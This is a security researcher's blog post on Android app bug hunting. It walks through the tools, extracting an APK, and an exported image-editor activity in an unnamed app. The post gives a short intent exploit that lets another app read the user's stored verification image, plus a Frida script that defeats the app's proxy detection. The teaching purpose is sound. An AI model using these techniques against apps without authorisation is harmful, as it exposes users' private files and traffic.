# Android Exploitation

## Introduction

In this post, I'll write about how I found a bug in a popular Android app (whose name will be anonymous for now) and the steps I took to find it. Hoping this will help you understand how to approach finding bugs in Android apps.

> There are pre-requisites to this post. You should have a basic understanding of how Android apps work from a development perspective. If not, I recommend reading the [Android Developer documentation](https://developer.android.com/docs) first.

## Tooling

To get started with Android exploitation, you will need a few tools:

- **Android Studio**: This is the official IDE for Android development and comes with an emulator, which is useful for testing.
    1. **ADB (Android Debug Bridge)**: ADB comes along with Android Studio(available in `~/Android/Sdk/platform-tools/adb` on Ubuntu). It is essential for installing apps, debugging, and accessing the device's file system. We will use it to extract the APK file.
    2. **Emulator**: The Android emulator allows you to run Android apps on your computer. I recommend creating an emulator with "Google APIs" to ensure you have access to Google Play Services, which many apps depend on and it also allows you to get root access easily with `adb root`(Google Play Store image will produce an error `Cannot run as root on production builds` and Android Open Source(AOSP) image might not have some needed libraries). I like to use relatively newer Android versions like Android 14+(API 34+) to ensure compatibility with the latest apps.

- **APKTool**: This tool is used to decompile APK files, allowing you to inspect the app's resources and code. It can be also used to re-build the modified, decompiled APK files but you will need to sign them before installing on the device (you can use `jarsigner` or `apksigner` for this). This might not work for all apps, especially those that use ProGuard for obfuscation or split APKs.

- **Jadx-GUI**: This is a Java decompiler that can be used to view the Java source code of the app. It is useful for understanding the app's logic and finding potential vulnerabilities. This tool is what we will use to statically analyze the app's code.

- **HTTP Toolkit**: This tool is used to intercept and modify HTTP/HTTPS traffic between the app and the server. It is useful for testing the app's network communication and finding vulnerabilities related to insecure communication.

- **Frida**: This is a dynamic analysis tool that allows you to inspect the app's runtime behavior and patch APK functions at runtime. We can use this to bypass certificate pinning using frida scripts from HTTP toolkit as described in this [blog](https://httptoolkit.com/blog/frida-certificate-pinning/). Frida can also be used to find vulnerabilities related to insecure data storage, insecure communication, and other runtime issues.

## Starting Point

Once you select your target app, for example, Google Maps, the first thing you need to do is extract the APK file. I will use Android Studio for this so that I can extract the official APK file installed from Google PlayStore or Samsung Store, rather than an APK from a third-party source.

To extract the APK from your phone, enable developer mode on your Android device by going to Settings > "About Phone" > "Software Information" and tapping on the "Build Number" 7 times. Then, go to Settings > "Developer Options", enable "USB Debugging" and connect it to your computer.

Now, you should see your device listed when you run `adb devices`.

```bash
$ adb devices
List of devices attached
RF8XB12DEFF     device

$ adb shell
a16:/ $
```

To extract the APK file, first find the package name of the app and then extract it as seen below:

```bash
$ adb shell pm list packages | grep maps
package:com.google.android.apps.maps
package:com.samsung.android.mapsagent

$ adb shell pm path com.google.android.apps.maps
package:/data/app/~~4NRB78MMve5o_97sXX15Xw==/com.google.android.apps.maps-vJI9KA3Ry0yIPhrv1aWmXg==/base.apk
package:/data/app/~~4NRB78MMve5o_97sXX15Xw==/com.google.android.apps.maps-vJI9KA3Ry0yIPhrv1aWmXg==/split_config.arm64_v8a.apk
package:/data/app/~~4NRB78MMve5o_97sXX15Xw==/com.google.android.apps.maps-vJI9KA3Ry0yIPhrv1aWmXg==/split_config.en.apk
package:/data/app/~~4NRB78MMve5o_97sXX15Xw==/com.google.android.apps.maps-vJI9KA3Ry0yIPhrv1aWmXg==/split_config.xxhdpi.apk

$ adb pull /data/app/~~4NRB78MMve5o_97sXX15Xw==/com.google.android.apps.maps-vJI9KA3Ry0yIPhrv1aWmXg==/base.apk
/data/app/~~4NRB78MMve5o_97sXX15Xw==/com.google.android.apps.maps-...pk: 1 file pulled, 0 skipped. 26.0 MB/s (68096877 bytes in 2.494s)
```

Now that we have the APK file, we can do some static analysis using APKTool and Jadx-GUI.

## Static Analysis

I like using Jadx-GUI for static analysis as it provides a user-friendly interface to view the decompiled code. First thing I like to check is the `AndroidManifest.xml` file(under `Resources` tab in Jadx-gui) to see the permissions requested by the app and to check if the app has any exported components (activities, services, etc.) that can be accessed by other apps.

Checkout the documentation on Android activities [here](https://developer.android.com/guide/components/activities/intro-activities) but in a nutshell, Android App activities that are exported(shown as `exported="true"` in `AndroidManifest.xml`) can be accessed by other malicious apps, which can lead to potential vulnerabilities if not handled properly.

Coming back to the "Anonymous" app, I looked at the exported activities and found one that used a third-party library for image editing. Below we see the [library](https://github.com/iamutkarshtiwari/ImageEditor-Android) being used:

```xml
<!-- From "Anonymous" App AndroidManifest.xml -->
<activity
    android:label="@string/iamutkarshtiwari_github_io_ananas_library_name"
    android:name="iamutkarshtiwari.github.io.ananas.editimage.EditImageActivity"
    android:exported="true"
    android:screenOrientation="portrait"/>
```

Now, the first thing we want to see is the `onCreate()` function of the above activity because when an activity is launched, the `onCreate()` method is called, which is where the activity's UI is created so it's like looking at the main function/entry point of the activity. Below is the code for the `onCreate()` method of the `EditImageActivity` class:

```java
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    setContentView(R.layout.activity_image_edit);
    getWindow().setStatusBarColor(ContextCompat.getColor(this, R.color.materialcolorpicker__blue));
    getData();
    initView();
}
```

The `getData()` method is where the app gets the data to be edited. I looked at the `getData()` method and found that it was getting data from the intent(read up on Android Intents [here](https://developer.android.com/reference/android/content/Intent)) that started the activity i.e., we control the data that is passed to the activity. The code for the `getData()` method is as follows:

```java
private void getData() {
    this.isPortraitForced = getIntent().getBooleanExtra(ImageEditorIntentBuilder.FORCE_PORTRAIT, false);
    this.isSupportActionBarEnabled = getIntent().getBooleanExtra(ImageEditorIntentBuilder.SUPPORT_ACTION_BAR_VISIBILITY, false);
    this.sourceFilePath = getIntent().getStringExtra(ImageEditorIntentBuilder.SOURCE_PATH);
    this.outputFilePath = getIntent().getStringExtra(ImageEditorIntentBuilder.OUTPUT_PATH);
    this.editorTitle = getIntent().getStringExtra(ImageEditorIntentBuilder.EDITOR_TITLE);
    this.showAutoCropImage = getIntent().getBooleanExtra(ImageEditorIntentBuilder.CROP_IMAGE_FEATURE_AUTO_SELECT, false);
}
```

The above code reveals that the source path for the image is controlled by the calling intent. We just need to put an [`Extra`](https://developer.android.com/reference/android/content/Intent#putExtra(java.lang.String,%20android.os.Bundle)) to our calling intent with the key as `source_path` (the parameter `ImageEditorIntentBuilder.SOURCE_PATH` is defined as `source_path` string). This should allow us(an external malicious app) to access internal images stored by the "Anonymous" app. The internal files used by an app are stored in `/data/data/<package-name>/files` and the "Anonymous" app stores an image of the user(image required for verification) in `/data/data/<anonymous-package-name>/files/CHALLENGE_IMAGE`.

So, I wrote a simple app to test the exploit and it worked! I had access to the internal images of the app. Below is the exploit code:

```Java
Intent intent = new Intent();
intent.setClassName("anonymous.package.name", "iamutkarshtiwari.github.io.ananas.editimage.EditImageActivity");
intent.putExtra("source_path", "/data/data/anonymous.package.name/files/CHALLENGE_IMAGE");
startActivity(intent);
```

The exploit code simply creates an empty Intent(no specific action set), specifies the activity to be targetted, sets the `source_path` to the internal image path and starts the activity.

Additionally, the above activity also had the following permission which theoretically should allow access to the files stored on the external storage.

```java
private final String[] requiredPermissions = {"android.permission.READ_EXTERNAL_STORAGE"};
```

[Scoped Storage](https://source.android.com/docs/core/storage/scoped) was enforced on Android 11 which restricts access to external storage behind the "READ/WRITE/MANAGE_EXTERNAL_STORAGE" permissions. But I had issues with getting it to work on my Android 15 emulator with paths like `/mnt/sdcard/DCIM/test.jpg`. If you know any possible reasons/suggestions, feel free to message me on discord(@Zeeshan1234) or twitter(@realzeeshan1234).

## Network Analysis

[HTTP Toolkit](https://httptoolkit.com/) is a truly awesome tool for intercepting and modifying HTTP/HTTPS traffic on Android. As long as you have a rooted emulator or device, you simply have to click the "Android Device via ADB" button and it automatically sets up the proxy for you including installing the certificate on the device.

> Note: make sure to run `adb root` or have root access on the emulator/device. This is required for HTTP Toolkit to install the certificate in "System Certificates" in addition to "User Certificates" which are by default not trusted by modern apps.

For a non-rooted device, [pcapdroid](https://github.com/emanuele-f/PCAPdroid) might be a good alternative but I didn't have great success with it.

### Certificate Pinning

Certificate pinning is a security measure used by apps to ensure that they only communicate with trusted servers. This is done by embedding the server's certificate in the app and rejecting any connections to servers with different certificates. This can be a problem for security researchers as it prevents us from intercepting the traffic using tools like HTTP Toolkit.

Once you have set up HTTP Toolkit, you can use Frida to bypass certificate pinning by following the httptoolkit blog post [here](https://httptoolkit.com/blog/frida-certificate-pinning/). This is useful for testing the app's network communication and finding vulnerabilities related to insecure communication.

## Dynamic Patching

Dynamic patching is a technique used to modify the behavior of an app at runtime. This can be useful for bypassing security measures or modifying the app's behavior for testing purposes.

To use frida for dynamic patching, you need to run the `frida-server` binary on your emulator/device or alternatively patch the APK using [objection](https://pypi.org/project/objection/). I like to use frida-server directly, you can do this by downloading the platform-relevant(`adb shell getprop | grep ro.product.cpu.abi`) frida-server binary from the [Frida releases page](https://github.com/frida/frida/releases/) and pushing it to the `/data/local/tmp` directory on your emulator/device:

```bash
$ adb push frida-server /data/local/tmp/
frida-server: 1 file pushed, 0 skipped. 136.8 MB/s (114296792 bytes in 0.797s)
$ adb shell
emu64xa:/ # cd /data/local/tmp
emu64xa:/data/local/tmp # chmod +x frida-server
emu64xa:/data/local/tmp # ./frida-server &
[1] 6069
```

To install the frida client, you can use `pip install frida-tools`. You can then use the `frida-ps -U` command to list the running processes on the device/emulator and verify that frida is working correctly:

```bash
$ frida-ps -U
 PID  Name
----  ------------------------------------------------------
4942  Clock
1443  Google
5570  HTTP Toolkit
3153  Messages
4914  Personal Safety
```

- > Note: If you get an error like `Failed to connect to remote frida-server: Connection refused`, make sure that the frida-server is running on the device/emulator and that you have root access.

- > If you get an error like "unable to access process due to system restrictions; try `sudo sysctl kernel.yama.ptrace_scope=0`, or run Frida as root", there's a good chance that you are running an incompatible version of frida-server like x86_64 on an ARM device/emulator.

You can attach frida to a specific process using the `frida -U <process-name>` command by getting the process name from `frida-ps`(If there are spaces in process names, use backslash e.g. `frida -U HTTP\ Toolkit`). This will attach frida to the process and allow you to run scripts on it. You can also use the `-l` option to load a script file e.g. `frida -U -l intercept.js HTTP\ Toolkit`.

### Practical Example

In the "Anonymous" app, there was an `isVpnActive` function that checked if there was an active proxy intercepting network traffic and then dropped the communication if that was the case.

```Java
public final boolean isVpnActive(Context context) {
    Intrinsics.checkNotNullParameter(context, "context");
    Object systemService = context.getSystemService("connectivity");
    Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.net.ConnectivityManager");
    ConnectivityManager connectivityManager = (ConnectivityManager) systemService;
    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(connectivityManager.getActiveNetwork());
    return networkCapabilities != null && networkCapabilities.hasTransport(4);
}
```

We can patch this function dynamically with frida. First, we need to identify the Java class that contains this function. At the top of the decompiled file in jadx-gui containing the function, there will be a line as follows which tells us the class package:

```java
package anonymous.app.name.networks.common;
```

Knowing that and the name of the class containing the function `public final class Constants` in my case, we can simply override the implementation of `isVpnActive` to return `false` since it is a `boolean` function. Setting it to return `false` means that our network proxy will not be detected by the app and we will be able to intercept traffic freely. The relevant script is below:

```javascript
Java.perform(() => {
    var Constants = Java.use("anonymous.app.name.network.common.Constants");

    Constants.isVpnActive.implementation = function(arg) {
        console.log("isVpnActive triggered");
        return false;
    }
})
```

Using the above intercept script alongwith certificate pinning bypass frida scripts from HTTP toolkit [blog](https://httptoolkit.com/blog/frida-certificate-pinning), I was successful in intercepting the network traffic of the "Anonymous" app.

------------

Well, that was it for my first Android Exploitation blog post, hope you found it interesting and maybe even learned something new! Ciao!
